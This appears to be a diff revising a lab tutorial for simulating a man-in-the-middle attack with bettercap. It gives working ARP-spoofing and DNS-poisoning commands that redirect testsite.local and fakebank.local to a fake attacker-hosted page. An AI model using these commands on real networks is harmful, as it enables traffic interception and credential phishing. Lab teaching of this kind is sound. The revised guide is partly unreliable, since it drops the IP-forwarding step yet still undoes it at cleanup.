@@ -1,4 +1,4 @@
-# Problem
+# Summary
 
 Simulate a Man-in-the-Middle (MITM) attack using ARP spoofing and DNS poisoning in an isolated lab environment. This demonstrates how attackers can intercept traffic and redirect DNS queries to malicious servers.
 
@@ -6,49 +6,13 @@ Simulate a Man-in-the-Middle (MITM) attack using ARP spoofing and DNS poisoning 
 
 ### Lab Setup
 
-**Hardware:**
+**Requirements:**
 
-- 2x Raspberry Pis (Pi 4 or 5) — one Attacker, one Victim
-- 1 Router/AP (both Pis on same subnet)
+- A Raspberry Pi with Kali Linux installed and dependencies (bettercap) installed.
 
-**Software:**
+### Part A: ARP Spoofing
 
-- Attacker Pi: Bettercap installed (see installation below)
-- Victim Pi: Standard Raspberry Pi OS with browser or curl
-
----
-
-### Prerequisites — Install Packages on Attacker Pi
-
-**Step 1.** Update package lists:
-
-```bash
-sudo apt update
-```
-
-**Step 2.** Install Bettercap and dependencies:
-
-```bash
-sudo apt install -y bettercap libpcap-dev libnetfilter-queue-dev
-```
-
-**Step 3.** (Optional) Install Python for fake web server:
-
-```bash
-sudo apt install -y python3
-```
-
----
-
-### Attacker Configuration
-
-**Step 4.** Enable IP forwarding so the attacker can route victim traffic without dropping packets:
-
-```bash
-sudo sysctl -w net.ipv4.ip_forward=1
-```
-
-**Step 5.** Launch Bettercap on your network interface:
+**Step 1.** Launch Bettercap on your network interface:
 
 ```bash
 sudo bettercap -iface wlan0
@@ -58,51 +22,18 @@ Replace `wlan0` with your actual interface — use `eth0` for Ethernet.
 
 ---
 
-### Step A: ARP Spoofing
+#### Gateway Spoof (Victim ↔ Router/Internet)
 
-#### Option 1: Local/Internal Spoof (Computer A ↔ Computer B)
-
-Use this when you want to intercept traffic between two computers on the same LAN (not internet traffic).
-
-**Step 6a.** Inside Bettercap, probe the network to discover devices:
+**Step 2.** Inside Bettercap, probe the network to discover devices:
 
 ```jsx
 net.probe on
 
 ```
 
-**Step 7a.** Note the IPs of Computer A and Computer B from the output.
+**Step 3.** Note the Victim's IP and Router's IP from the output.
 
-**Step 8a.** Configure ARP spoofing for internal/local traffic:
-
-```
-set arp.spoof.targets <COMPUTER_A_IP>,<COMPUTER_B_IP>
-set arp.spoof.internal true
-set arp.spoof.fullduplex true
-arp.spoof on
-```
-
-<aside>
-💡
-
-**arp.spoof.internal true** enables spoofing of local LAN traffic between hosts. Without this, Bettercap only spoofs traffic going through the gateway.
-
-**Result:** Computer A thinks the attacker is Computer B, and Computer B thinks the attacker is Computer A. All traffic between them passes through you.
-
-</aside>
-
-#### Option 2: Gateway Spoof (Victim ↔ Router/Internet)
-
-**Step 6.** Inside Bettercap, probe the network to discover devices:
-
-```jsx
-net.probe on
-
-```
-
-**Step 7.** Note the Victim's IP and Router's IP from the output.
-
-**Step 8.** Set the ARP spoof target and enable **full-duplex mode**:
+**Step 4.** Set the ARP spoof target and enable **full-duplex mode**:
 
 ```
 set arp.spoof.targets <VICTIM_IP>
@@ -110,26 +41,21 @@ set arp.spoof.fullduplex true
 arp.spoof on
 ```
 
-<aside>
-💡
-
-**Full-duplex mode** spoofs BOTH directions:
+💡 **Full-duplex mode** spoofs BOTH directions:
 
 - Tells the **Victim** that the attacker is the router
 - Tells the **Router** that the attacker is the victim
 
 This ensures you intercept traffic going TO and FROM the victim.
 
-</aside>
-
 ---
 
-### Step B: DNS Poisoning
+### Part B: DNS Poisoning
 
-**Step 9.** With ARP spoof active, configure DNS spoofing to redirect specific domains to the attacker. In the Bettercap prompt:
+**Step 5.** With ARP spoof active, configure DNS spoofing to redirect specific domains to the attacker. In the Bettercap prompt:
 
 ```
-set dns.spoof.ttl 60
+set dns.spoof.ttl 300
 set [dns.spoof.domains](http://dns.spoof.domains) testsite.local,fakebank.local
 set dns.spoof.address <ATTACKER_IP>
 dns.spoof on
@@ -137,14 +63,12 @@ dns.spoof on
 
 Replace `<ATTACKER_IP>` with the attacker Pi's IP address.
 
-<aside>
-⚠️
 
-**dns.spoof.ttl 60** sets the TTL to 60 seconds. The default (1024 seconds) causes spoofed DNS entries to persist on the victim long after you stop the attack. A low TTL ensures the victim's cache expires quickly during cleanup.
+⚠️ **dns.spoof.ttl 300** sets the TTL to 300 seconds. The default (1024 seconds) causes spoofed DNS entries to persist on the victim long after you stop the attack. A low TTL ensures the victim's cache expires quickly during cleanup.
 
-</aside>
+### Part C: (Optional) Fake Server
 
-**Step 10.** (Optional) Start a fake web server on the attacker to serve a landing page:
+**Step 6.** (Optional) Start a fake web server on the attacker to serve a landing page:
 
 ```bash
 python3 -m http.server 80
@@ -154,25 +78,25 @@ python3 -m http.server 80
 
 ### Verification on Victim Pi
 
-**Step 11.** On the Victim Pi, verify the ARP table shows the router's IP mapped to the **attacker's MAC address**:
+**Step 7.** On the Victim Pi, verify the ARP table shows the router's IP mapped to the **attacker's MAC address**:
 
 ```bash
 arp -a
 ```
 
-**Step 12.** Test DNS resolution — it should return the attacker's IP:
+**Step 8.** Test DNS resolution — it should return the attacker's IP:
 
 ```bash
 nslookup testsite.local
 ```
 
-**Step 13.** Open a browser and navigate to [`](http://testsite.local)http://testsite.local` — you should see the attacker's fake page.
+**Step 9.** Open a browser and navigate to [`](http://testsite.local)http://testsite.local` — you should see the attacker's fake page.
 
 ---
 
 ### Cleanup — Restore Attacker Pi to Normal
 
-**Step 14.** Stop Bettercap modules (inside Bettercap prompt):
+**Step 10.** Stop Bettercap modules (inside Bettercap prompt):
 
 ```
 dns.spoof off
@@ -180,13 +104,13 @@ arp.spoof off
 exit
 ```
 
-**Step 15.** Disable IP forwarding:
+**Step 11.** Disable IP forwarding:
 
 ```bash
 sudo sysctl -w net.ipv4.ip_forward=0
 ```
 
-**Step 16.** (Optional) Remove installed packages to fully restore the system:
+**Step 12.** (Optional) Remove installed packages to fully restore the system:
 
 ```bash
 sudo apt remove --purge -y bettercap libpcap-dev libnetfilter-queue-dev
@@ -194,7 +118,7 @@ sudo apt autoremove -y
 sudo apt clean
 ```
 
-**Step 17.** Verify IP forwarding is disabled (should return `0`):
+**Step 13.** Verify IP forwarding is disabled (should return `0`):
 
 ```bash
 cat /proc/sys/net/ipv4/ip_forward
